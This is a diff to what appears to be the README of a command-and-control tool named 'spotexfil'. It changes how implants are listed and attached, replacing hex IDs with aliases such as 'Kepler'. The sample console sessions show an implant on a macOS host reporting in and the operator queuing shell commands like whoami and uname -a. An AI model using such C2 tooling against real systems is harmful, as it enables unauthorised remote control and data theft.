@@ -153,9 +153,9 @@ SPOTEXFIL_KEY="bravo-kilo-seven-echo-tango-lima" ./spotexfil-darwin-arm64 c2-ope
 
   Polling every 30s | Type 'help' for commands
 
-[+] New implant connected!
-    client_id : 7f3a2b1c9e04d8f1
-    session   : a3f2b7c91e04
+[+] New implant: Kepler
+    alias     : Kepler
+    client_id : 7f3a2b1c
     hostname  : target.local
     os        : darwin/arm64
     user      : admin
@@ -163,13 +163,13 @@ SPOTEXFIL_KEY="bravo-kilo-seven-echo-tango-lima" ./spotexfil-darwin-arm64 c2-ope
 
 [15:30] c2> agents
 
-  ID               HOSTNAME         OS                   USER       CONNECTED
-  ---------------- ---------------- -------------------- ---------- -------------------
-  7f3a2b1c9e04d8f1 target.local     darwin/arm64         admin      2026-04-18 15:30:05
+  NAME       ID         OS             HOSTNAME         USER       CONNECTED
+  ---------- ---------- -------------- ---------------- ---------- -------------------
+  Kepler     7f3a2b1c   darwin/arm64   target.local     admin      2026-04-18 15:30:05
 
-[15:30] c2> attach 7f3a
-[*] Attached to 7f3a2b1c9e04d8f1 (target.local)
-[15:30] 7f3a2b1c@target.local > whoami
+[15:30] c2> attach kepler
+[*] Attached to Kepler (target.local)
+[15:30] Kepler@target.local > whoami
 [*] Command queued: seq=1 module=shell
 [15:30] 7f3a2b1c@target.local > uname -a
 [*] Command queued: seq=2 module=shell
@@ -211,7 +211,7 @@ $ cat /etc/hosts
 ```
 Agent management:
   agents          List connected implants
-  attach <id>     Attach to an agent (prefix match, e.g. 'attach 7f3a')
+  attach <name>   Attach by name or ID (e.g. 'attach kepler' or 'attach 7f3a')
   detach          Detach from current agent
 
 Commands (when attached, type directly or use prefix):
